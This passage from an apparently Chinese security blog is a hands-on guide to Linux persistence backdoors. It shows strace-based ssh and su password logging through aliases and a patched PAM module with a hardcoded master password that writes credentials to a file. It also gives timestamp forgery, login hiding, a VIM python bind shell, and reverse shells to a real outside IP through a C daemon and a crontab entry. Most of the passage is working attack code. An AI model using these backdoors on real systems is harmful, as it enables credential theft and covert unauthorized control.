href="#SSH-Keylogger键盘记录" class="headerlink" title="SSH Keylogger键盘记录"></a>SSH Keylogger键盘记录</h2><blockquote><p>了解即可，知道怎么用，alias后门的一种</p><p>我们可以通过记录键盘值获取许多信息，比如在主机中登陆了其他的东西，ssh就能获取</p></blockquote><p>编辑当前用户下的 .bashrc 文件，在配置文件末尾添加：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">alias</span> ssh=<span class="string">&#x27;strace -o /tmp/sshpwd-`date +%d%h%m%s`.log -e read,write,connect -s2048 ssh&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#strace 我们可以使用strace对应用的系统调用和信号传递的跟踪结果来对应用进行分析，以达到解决问题或者是了解应用工作过程的目的。</span></span><br><span class="line"><span class="comment">#在命令执行的过程中，strace会记录和解析命令进程的所有系统调用以及这个进程所接收到的所有的信号值。</span></span><br><span class="line"><span class="comment">#参数-o filename 将strace的输出写入文件filename</span></span><br><span class="line"><span class="comment">#参数-e read=set 输出从指定文件中读出 的数据.例如: -e read=3,5</span></span><br><span class="line"><span class="comment">#参数-e write=set 输出写入到指定文件中的数据.</span></span><br><span class="line"><span class="comment">#参数-s strsize 指定输出的字符串的最大长度.默认为32.文件名一直全部输出.</span></span><br><span class="line"><span class="comment">#末尾的ssh是以strace ssh启动到达ssh程序，使用strace了解程序输入输出，类似debug的过程~~所以我们会在不知不觉中生成记录键盘输入的文件log，并且无感的执行了ssh</span></span><br></pre></td></tr></table></figure><blockquote><p>解释：</p><p>alias讲ssh命令别名等于<code>strace -o /tmp/sshpwd-date +%d%h%m%s.log -e read,write,connect -s2048 ssh</code>,与执行ssh有相同的效果，但是其在不知不觉中执行了没有回显的命令，将在temp目录下生成一个log文件~~~</p><p>ssh连接输入密码时的密码无论错误或者正确都能记录到log里。</p><p>如果想更加隐蔽 可以把生成的log改去其他目录~~~</p><p>如下图中，read函数里面的内容就是我们每次按下的按键！~~</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208212350723.png" alt="image-20220821235055521" style="zoom:50%;" /></blockquote><h2 id="SSH隐身登录"><a href="#SSH隐身登录" class="headerlink" title="SSH隐身登录"></a>SSH隐身登录</h2><blockquote><p>较好的方式，隐身登录系统，不会被last who w等指令检测到</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208291236826.png" alt="image-20220829123612629" style="zoom: 33%;" /></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -T root@192.168.22.11 /bin/bash -i</span><br><span class="line">ssh -o UserKnownHostsFile=/dev/null -T root@192.168.22.11 /bin/bash -<span class="keyword">if</span></span><br></pre></td></tr></table></figure><blockquote><p>补充一些命令：</p><ul><li>who     查看当前登录用户（tty本地登陆  pts远程登录）</li><li>w       查看系统信息，想知道某一时刻用户的行为，可以看到当前时间有几个用户在线</li><li>last     最后登录时间的用户，，still logged in表示还在该用户依旧在线，tty本地登陆  pts远程登录</li><li>uptime  查看登陆多久、多少用户，负载</li><li>查询特权用户特权用户(uid 为0)</li></ul><blockquote><p>awk -F: ‘$3&#x3D;&#x3D;0{print $1}’ &#x2F;etc&#x2F;passwd</p></blockquote><ul><li>查询可以远程登录的帐号信息</li></ul><blockquote><p>awk ‘&#x2F;$1|$6&#x2F;{print $1}’ &#x2F;etc&#x2F;shadow</p></blockquote><ul><li>除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</li></ul><blockquote><p>more &#x2F;etc&#x2F;sudoers | grep -v “^#|^$” | grep “ALL&#x3D;(ALL)”</p></blockquote></blockquote><h1 id="Strace后门"><a href="#Strace后门" class="headerlink" title="Strace后门"></a>Strace后门</h1><blockquote><p>SSH Keylogger键盘记录中有讲到如何使用strace创建后门~~</p></blockquote><p>strace常用来跟踪进程执行时的系统调用和所接收的信号。 在Linux世界，进程不能直接访问硬件设备，当进程需要访问硬件设备(比如读取磁盘文件，接收网络数据等等)时，必须由用户态模式切换至内核态模式，通 过系统调用访问硬件设备。strace可以跟踪到一个进程产生的系统调用,包括参数，返回值，执行消耗的时间。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh=<span class="string">&#x27;strace -o /tmp/sshpwd-`date +%d%h%m%s`.log -e read,write,connect -s2048 ssh&#x27;</span></span><br><span class="line">su=<span class="string">&#x27;strace -o /tmp/sulog-`date +%d%h%m%s`.log -e read,write,connect -s2048 su&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="Linux-PAM-后门"><a href="#Linux-PAM-后门" class="headerlink" title="Linux PAM 后门"></a>Linux PAM 后门</h1><blockquote><ul><li>难以发现 实用，源码级别的后门</li><li>PAM是Linux默认的ssh认证登录机制，因为他是开源的，我们可以修改源码实现自定义认证逻辑，达到记录密码、自定义密码登录、dns带外等功能。参考学习：<a href="https://www.cnblogs.com/kevingrace/p/8671964.html">Linux下PAM模块学习总结</a></li><li>概述：当我们获取目标主机权限后，可以尝试对pam组件源码进行修改，重新编译生成so文件，</li></ul></blockquote><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><h3 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dpkg -l | grep pam<span class="comment">#查看pam版本</span></span><br></pre></td></tr></table></figure><h3 id="centos"><a href="#centos" class="headerlink" title="centos"></a>centos</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/centos-release<span class="comment">#查看操作系统版本</span></span><br><span class="line">CentOS Linux release 7.7.1908 (Core)</span><br><span class="line"></span><br><span class="line">rpm -qa|grep pam<span class="comment">#查看pam版本，后门下载对应版本的源码</span></span><br><span class="line">gnome-keyring-pam-3.28.2-1.el7.x86_64</span><br><span class="line">fprintd-pam-0.8.1-2.el7.x86_64</span><br><span class="line">pam-1.1.8-22.el7.x86_64</span><br></pre></td></tr></table></figure><p>centos需要关闭selinux，临时关闭<code>setenforce 0</code>。永久关闭需要修改<code>/etc/selinux/config</code>，将其中SELINUX设置为disabled。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sestatus命令</span></span><br><span class="line">SELinux status:                 disabled<span class="comment">#查询结果</span></span><br><span class="line"><span class="comment">#/etc/selinux/config命令</span></span><br><span class="line"><span class="comment">#结果：</span></span><br><span class="line"><span class="comment"># This file controls the state of SELinux on the system.</span></span><br><span class="line"><span class="comment"># SELINUX= can take one of these three values:</span></span><br><span class="line"><span class="comment">#     enforcing - SELinux security policy is enforced.</span></span><br><span class="line"><span class="comment">#     permissive - SELinux prints warnings instead of enforcing.</span></span><br><span class="line"><span class="comment">#     disabled - No SELinux policy is loaded.</span></span><br><span class="line">SELINUX=disabled</span><br><span class="line"><span class="comment"># SELINUXTYPE= can take one of three values:</span></span><br><span class="line"><span class="comment">#     targeted - Targeted processes are protected,</span></span><br><span class="line"><span class="comment">#     minimum - Modification of targeted policy. Only selected processes are protected.</span></span><br><span class="line"><span class="comment">#     mls - Multi Level Security protection.</span></span><br><span class="line">SELINUXTYPE=targeted</span><br></pre></td></tr></table></figure><h2 id="下载pam源码"><a href="#下载pam源码" class="headerlink" title="下载pam源码"></a>下载pam源码</h2><h3 id="快捷命令获取源码"><a href="#快捷命令获取源码" class="headerlink" title="快捷命令获取源码~"></a>快捷命令获取源码~</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get <span class="built_in">source</span> libpam-modules=`dpkg -s libpam-modules | grep -i version | <span class="built_in">cut</span> -d<span class="string">&#x27; &#x27;</span> -f2`</span><br><span class="line"></span><br><span class="line"><span class="comment">#apt-get source - 可以下载源码文件</span></span><br><span class="line"><span class="comment">#dpkg -s libpam-modules | grep -i version | cut -d&#x27; &#x27; -f2- 查询Ubuntu的pam版本</span></span><br></pre></td></tr></table></figure><h3 id="开源源码下载"><a href="#开源源码下载" class="headerlink" title="开源源码下载"></a>开源源码下载</h3><blockquote><p>查看PAM版本<code>rpm -qa|grep pam</code></p><p>下载对应源码:</p><blockquote><blockquote><p>Ubuntu建议在这里下载</p></blockquote><ul><li><a href="https://code.launchpad.net/~ubuntu-core-dev/ubuntu/+source/pam/+git/pam">https://code.launchpad.net/~ubuntu-core-dev/ubuntu/+source/pam/+git/pam</a></li></ul><blockquote><p>用GitHub上面的源码编译出来貌似有点问题，</p></blockquote><ul><li><a href="https://github.com/linux-pam/linux-pam/archive/refs/tags/Linux-PAM-1_1_8.tar.gz">https://github.com/linux-pam/linux-pam/archive/refs/tags/Linux-PAM-1_1_8.tar.gz</a></li><li><a href="https://github.com/linux-pam/linux-pam/archive/refs/tags/v1.3.1.tar.gz">https://github.com/linux-pam/linux-pam/archive/refs/tags/v1.3.1.tar.gz</a></li></ul></blockquote><p><strong>针对基于 Debian 的 Linux 发行版</strong>，是否有适配其他发行版请阅读<a href="https://github.com/linux-pam/linux-pam">readme文件</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://github.com/linux-pam/linux-pam/archive/refs/tags/v1.3.1.tar.gz</span><br><span class="line">tar -zxf v1.3.1.tar.gz</span><br></pre></td></tr></table></figure><h2 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h2><blockquote><p>编译的环境</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Ubuntu</span></span><br><span class="line">apt install -y gcc flex dpkg-dev</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#centos</span></span><br><span class="line"><span class="comment">#需要先换源，然后更新依赖关系~</span></span><br><span class="line">yum install -y epel-release</span><br><span class="line"><span class="comment">#安装gcc编译器和flex库</span></span><br><span class="line">yum install gcc flex flex-devel -y</span><br></pre></td></tr></table></figure><blockquote><ul><li>centos常用包管理命令参考：<a href="https://vence.github.io/2016/05/14/centos-packagemanager/">https://vence.github.io/2016/05/14/centos-packagemanager/</a></li><li>按照过程中遇到问题：yum install告知“没有可用软件包 xxx”</li></ul><blockquote><p>需要先换源，然后update，参考：<a href="https://blog.csdn.net/wsuyixing/article/details/125824442">https://blog.csdn.net/wsuyixing/article/details/125824442</a></p></blockquote></blockquote><h2 id="修改pam-unix-auth-c源码"><a href="#修改pam-unix-auth-c源码" class="headerlink" title="修改pam_unix_auth.c源码"></a>修改pam_unix_auth.c源码</h2><blockquote><p>linux-pam-Linux-PAM-1_1_8&#x2F;modules&#x2F;pam_unix&#x2F;pam_unix_auth.c</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> v1.3.1</span><br><span class="line">vim ./modules/pam_unix/pam_unix_auth.c</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//添加代码</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">&quot;11pm&quot;</span>,p)==<span class="number">0</span>) &#123;<span class="keyword">return</span> PAM_SUCCESS;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>11pm为设置的密码。如果输入的密码是11pm则直接返回成功，不会进行其他操作</p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208212352885.png" alt="image-20220821235238764" style="zoom:50%;" /><h2 id="编译生成so文件"><a href="#编译生成so文件" class="headerlink" title="编译生成so文件"></a>编译生成so文件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> v1.3.1</span><br><span class="line"><span class="comment">#自动生成配置脚本，大部分时候好像是需要如此</span></span><br><span class="line">./autogen.sh</span><br><span class="line"><span class="comment">#开始编译</span></span><br><span class="line"><span class="comment">#配置（./configure --help | less查看配置）</span></span><br><span class="line">./configure --prefix=/user --exec-prefix=/usr --localstatedir=/var --sysconfdir=/etc --disable-selinux --with-libiconv-prefix=/usr</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>编译后生成so文件的路径：Linux-PAM-1.1.8&#x2F;modules&#x2F;pam_unix&#x2F;.lib&#x2F;pam_unix.so</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208212352178.png" alt="image-20220821235259019"></p><h2 id="替换系统pam-unix-so文件"><a href="#替换系统pam-unix-so文件" class="headerlink" title="替换系统pam_unix.so文件"></a>替换系统pam_unix.so文件</h2><ul><li>查找系统pam_unix.so文件路径</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -name pam_unix.so 2&gt;/dev/null</span><br><span class="line"><span class="comment">#/lib/x86 64-linux-gnu/security/pam unix.so</span></span><br></pre></td></tr></table></figure><ul><li>备份系统pam_unix.so文件</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> /lib/x86_64-linux-gnu/security/pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so.bak</span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line"><span class="built_in">cp</span> /usr/lib/x86_64-linux-gnu/security/pam_unix.so /usr/lib/x86_64-linux-gnu/security/pam_unix.so.bak</span><br></pre></td></tr></table></figure><ul><li>替换系统pam_unix.so文件</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> /root/桌面/Linux-PAM-1.1.8/modules/pam_unix/.libs/pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so</span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line"><span class="built_in">cp</span> /root/temppp/11111/pam-1.3.1/modules/pam_unix/.libs/pam_unix.so /usr/lib/x86_64-linux-gnu/security/pam_unix.so</span><br></pre></td></tr></table></figure><ul><li>查询是否执行成功</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> $?</span><br><span class="line"><span class="comment">#用来返回上一条执行的结果！</span></span><br><span class="line"><span class="comment">#成功则返回0</span></span><br><span class="line"><span class="comment">#不成功则不是0的一个整数</span></span><br></pre></td></tr></table></figure><h2 id="修改时间戳"><a href="#修改时间戳" class="headerlink" title="修改时间戳"></a>修改时间戳</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">touch</span> pam_unix.so -r pam_xauth.so</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208311034561.png" alt="image-20220831103435233"></p><h2 id="SSH登录"><a href="#SSH登录" class="headerlink" title="SSH登录"></a>SSH登录</h2><p>复现成功~~~</p><p>密码为11pm，不影响原本root密码的登录。**使用了特定的密码绕过验证</p><h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><blockquote><p>若不进行优化，则查看日志文件：&#x2F;var&#x2F;log&#x2F;auth.log，可以发现这种方式下的登录跟正常登录下的情况不一样。</p></blockquote><h4 id="正常日志："><a href="#正常日志：" class="headerlink" title="正常日志："></a>正常日志：</h4><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208311047601.png" alt="image-20220831104741410"></p><h4 id="非正常日志："><a href="#非正常日志：" class="headerlink" title="非正常日志："></a>非正常日志：</h4><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208311049953.png" alt="image-20220831104913751"></p><h3 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h3><blockquote><p>修改Linux-PAM-1.1.8&#x2F;modules&#x2F;pam_unix&#x2F;pam_unix_auth.c</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* verify the password of this user */</span></span><br><span class="line">        retval = _unix_verify_password(pamh, name, p, ctrl);</span><br><span class="line"><span class="comment">//      if (strcmp(&quot;11pm&quot;,p)==0) &#123;return PAM_SUCCESS;&#125;</span></span><br><span class="line">        FILE * fp;</span><br><span class="line">        <span class="keyword">if</span> (retval == PAM_SUCCESS) &#123;</span><br><span class="line">          fp = fopen(<span class="string">&quot;/etc/pam.txt&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">          <span class="built_in">fprintf</span>(fp,<span class="string">&quot;%s-&gt;%s\n&quot;</span>, name,p);</span><br><span class="line">          fclose(fp);</span><br><span class="line">        &#125;</span><br><span class="line">        name = p = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><blockquote><p>修改Linux-PAM-1.1.8&#x2F;modules&#x2F;pam_unix&#x2F;support.c</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> _unix_verify_password(<span class="type">pam_handle_t</span> * pamh, <span class="type">const</span> <span class="type">char</span> *name ,<span class="type">const</span> <span class="type">char</span> *p, <span class="type">unsigned</span> <span class="type">int</span> ctrl)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">passwd</span> *<span class="title">pwd</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">        <span class="type">char</span> *salt = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="type">char</span> *data_name;</span><br><span class="line">        <span class="type">int</span> retval;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">&quot;11pm&quot;</span>,p)==<span class="number">0</span>) &#123;<span class="keyword">return</span> PAM_SUCCESS;&#125;</span><br><span class="line">        D((<span class="string">&quot;called&quot;</span>));</span><br></pre></td></tr></table></figure><p>然后编译生成so文件，替换系统pam_unix.so文件即可</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><ul><li><a href="https://qiita.com/Y4er/items/e413dffdd8b1b7d0a59a">Linux-PAM后门</a></li><li><a href="https://www.cnblogs.com/-qing-/p/13178917.html"><strong>Linux Pam后门总结拓展</strong></a></li><li><a href="https://xz.aliyun.com/t/7902">Linux Pam后门总结拓展</a></li></ul></blockquote><h1 id="VIM后门"><a href="#VIM后门" class="headerlink" title="VIM后门"></a>VIM后门</h1><p>前提条件：VIM安装了python扩展,默认安装的话都有python扩展，脚本可以放到python的扩展目录</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/lib/python2.7/site-packages &amp;&amp; $(<span class="built_in">nohup</span> vim -E -c <span class="string">&quot;pyfile s.py&quot;</span>&gt; /dev/null 2&gt;&amp;1 &amp;) &amp;&amp; <span class="built_in">sleep</span> 2 &amp;&amp; <span class="built_in">rm</span> -f s.py</span><br><span class="line"></span><br><span class="line"><span class="comment">#nohup将程序以忽略挂起信号的方式运行起来,即后台运行</span></span><br></pre></td></tr></table></figure><blockquote><p>s.py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os, threading, sys, time</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">        server=socket(AF_INET,SOCK_STREAM)</span><br><span class="line">        server.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">12345</span>))</span><br><span class="line">        server.listen(<span class="number">5</span>)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;waiting for connect&#x27;</span></span><br><span class="line">        talk, addr = server.accept()</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;connect from&#x27;</span>,addr</span><br><span class="line">        proc = subprocess.Popen([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>], stdin=talk,stdout=talk,stderr=talk, shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></blockquote><h1 id="Alias后门"><a href="#Alias后门" class="headerlink" title="Alias后门"></a>Alias后门</h1><blockquote><ul><li>通过alias来指定执行特定的命令时候静默运行其他程序，从而达到启动后门，记录键值等作用。</li><li>需要注意的是！！！<strong>直接在shell里设定的命令别名，在终端关闭或者系统重新启动后都会失效。下面也有讲如何永久生效，alias用法里面</strong></li></ul></blockquote><h2 id="alias用法"><a href="#alias用法" class="headerlink" title="alias用法"></a>alias用法</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#输入alias查看系统哪些别名 ，unalias删除别名，</span></span><br><span class="line"><span class="comment">#语法</span></span><br><span class="line"><span class="built_in">alias</span>(选项)(参数)</span><br><span class="line"><span class="comment">#选项</span></span><br><span class="line">-p：打印已经设置的命令别名。</span><br><span class="line"><span class="comment">#参数</span></span><br><span class="line">命令别名设置：定义命令别名，格式为“命令别名=‘实际命令’”。</span><br><span class="line"><span class="comment">#实例</span></span><br><span class="line"><span class="built_in">alias</span> 的基本使用方法为：<span class="built_in">alias</span> 新的命令=<span class="string">&#x27;原命令 -选项/参数&#x27;</span></span><br><span class="line"><span class="comment">#命令别名永久生效</span></span><br><span class="line">直接在shell里设定的命令别名，在终端关闭或者系统重新启动后都会失效，如何才能永久有效呢？办法就是将别名的设置加入~/.bashrc文件，然后重新载入下文件就可以了。</span><br><span class="line">vim ~/.bashrc</span><br><span class="line">在文件最后面加入别名设置，如：<span class="built_in">alias</span> <span class="built_in">rm</span>=’<span class="built_in">rm</span> -i’，保存后重新载入：</span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br><span class="line">这样就可以永久保存命令的别名了。因为修改的是当前用户目录下的.bashrc文件，所以这样的方式只对当前用户有用。如果要对所有用户都有效，修改/etc目录下的bashrc文件就可以了。在CentOS7下，这个文件是/etc/bash.bashrc。此外在CentOS7下，细看~/.bashrc文件，会发有这样一段代码：</span><br><span class="line"><span class="keyword">if</span> [ -f ~/.bash_aliases ]; <span class="keyword">then</span></span><br><span class="line">    . ~/.bash_aliases</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">这个代码的意思就是加载.bash_aliases文件，CentOS7已经帮我们考虑好了，所以也可以在用户根目录下新建一个文件.bash_aliases存放命令别名设置。</span><br></pre></td></tr></table></figure><h2 id="SSH-Keylogger键盘记录（前面有讲）"><a href="#SSH-Keylogger键盘记录（前面有讲）" class="headerlink" title="SSH Keylogger键盘记录（前面有讲）"></a>SSH Keylogger键盘记录（前面有讲）</h2><p>修改ssh命令，利用strace，使其具有记录ssh对read,write,connect调用的功能。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">alias</span> ssh=<span class="string">&#x27;strace -o /tmp/sshpwd-`date +%d%h%m%s`.log -e read,write,connect -s2048 ssh&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#编译下面的c代码文件后，再shell下执行即可</span></span><br><span class="line"><span class="built_in">alias</span> <span class="built_in">cat</span>=<span class="string">&#x27;/root/.shell &amp;&amp; cat&#x27;</span></span><br><span class="line"><span class="comment">#控制机器：</span></span><br><span class="line">nc -lvvp 8008</span><br><span class="line"><span class="comment">#如果监听失败使用</span></span><br><span class="line">nc -lvnp 8008</span><br><span class="line"><span class="comment">#-n 直接使用IP地址，而不通过域名服务器</span></span><br></pre></td></tr></table></figure><blockquote><p>编译c代码生成shell可执行文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc shell.c -o .shell</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">生成的.shell可以隐藏在当前目录</span></span><br></pre></td></tr></table></figure><p>shell.c记得将IP换为自己监听机器的ip</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ERR_EXIT(m) do&#123;perror(m); exit(EXIT_FAILURE);&#125;while (0);</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">creat_daemon</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">time_t</span> t;</span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line">creat_daemon();</span><br><span class="line">system(<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/124.223.217.243/8008 0&gt;&amp;1&quot;</span>);</span><br><span class="line"><span class="comment">//执行系统命令反弹shell</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">creat_daemon</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">pid_t</span> pid;</span><br><span class="line"><span class="type">int</span> devnullfd,fd,fdtablesize;</span><br><span class="line">umask(<span class="number">0</span>);</span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">if</span>( pid == <span class="number">-1</span>)</span><br><span class="line">  ERR_EXIT(<span class="string">&quot;fork error&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(pid &gt; <span class="number">0</span> )</span><br><span class="line">  <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line"><span class="keyword">if</span>(setsid() == <span class="number">-1</span>)</span><br><span class="line">  ERR_EXIT(<span class="string">&quot;SETSID ERROR&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="comment">/* close any open file descriptors */</span></span><br><span class="line"><span class="keyword">for</span>(fd = <span class="number">0</span>, fdtablesize = getdtablesize(); fd &lt; fdtablesize; fd++)</span><br><span class="line">  close(fd);</span><br><span class="line">devnullfd = open(<span class="string">&quot;/dev/null&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">/* make STDIN ,STDOUT and STDERR point to /dev/null */</span></span><br><span class="line"><span class="keyword">if</span> (devnullfd == <span class="number">-1</span>) &#123;</span><br><span class="line">  ERR_EXIT(<span class="string">&quot;can&#x27;t open /dev/null&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (dup2(devnullfd, STDIN_FILENO) == <span class="number">-1</span>) &#123;</span><br><span class="line">  ERR_EXIT(<span class="string">&quot;can&#x27;t dup2 /dev/null to STDIN_FILENO&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (dup2(devnullfd, STDOUT_FILENO) == <span class="number">-1</span>) &#123;</span><br><span class="line">  ERR_EXIT(<span class="string">&quot;can&#x27;t dup2 /dev/null to STDOUT_FILENO&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (dup2(devnullfd, STDERR_FILENO) == <span class="number">-1</span>) &#123;</span><br><span class="line">  ERR_EXIT(<span class="string">&quot;can&#x27;t dup2 /dev/null to STDOUT_FILENO&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">signal(SIGCHLD,SIG_IGN);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><h1 id="Crontab后门"><a href="#Crontab后门" class="headerlink" title="Crontab后门"></a>Crontab后门</h1><blockquote><p>之前写过一片llinux计划任务的文章：<a href="https://11pmsleep.github.io/2022-09-24-%E7%9F%A5%E8%AF%86/Linux/Linux-Crontab%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/">Linux-Crontab 计划任务</a></p></blockquote><blockquote><p>每分钟反弹一次shell给指定ip的8888端口</p></blockquote><h2 id="目标机器"><a href="#目标机器" class="headerlink" title="目标机器"></a>目标机器</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(crontab -l;<span class="built_in">echo</span> <span class="string">&#x27;*/1 * * * * exec 9&lt;&gt; /dev/tcp/124.223.217.243/8888;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i&#x27;</span>)|crontab -</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看当前计划任务</span></span><br><span class="line">crontab -l</span><br><span class="line"><span class="comment">#将标注输出通过管道符|写入计划任务</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;*/1 * * * * exec 9&lt;&gt; /dev/tcp/124.223.217.243/8888;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i&#x27;</span></span><br><span class="line"><span class="comment">#echo后门的内容就是反弹shell命令。</span></span><br><span class="line"><span class="comment">#exec 9&lt;&gt;/dev/tcp/124.223.217.243/6666;做的事情就是定义文件描述符9和将/dev/tcp/124.223.217.243/6666输入输出的重定向到自定义的标准文件描述符9中</span></span><br><span class="line"><span class="comment">#exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;做的事情就是将&amp;9接受的输入，重定向到标准输入；将标准错误输出重定向到标准输出，再将标准输出重定向到我们自己定义的文件描述符9之中输出</span></span><br><span class="line"><span class="comment">#/bin/bash --noprofile -i；做的事情就是，-i：实现脚本交互，--noprofile会跳过 Profile 